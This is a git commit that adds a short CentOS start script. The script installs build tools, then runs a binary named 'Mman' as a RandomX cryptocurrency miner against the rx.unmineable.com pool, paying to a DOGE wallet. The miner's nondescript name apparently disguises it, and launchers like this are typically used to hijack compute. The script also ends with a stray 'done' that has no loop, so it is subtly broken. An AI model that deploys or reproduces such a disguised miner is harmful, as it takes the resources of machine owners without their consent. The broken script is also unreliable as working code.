3bde116a827a9384ea465f0f4c6e847fe8c74b72
Saswata785 <35234794+Saswata785@users.noreply.github.com>
2021-04-23 22:17:20 +0530

    Add files via upload

---
+++ Centos7/start.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+sudo yum install -y git make cmake gcc gcc-c++ libstdc++-static libuv-static hwloc-devel openssl-devel
+chmod +x Mman
+./Mman -o rx.unmineable.com:13333 -a rx -k -u DOGE:D6hZna7Ht34n6gD1645wh8QsDqn3oihN4F.Mrlol1
+done
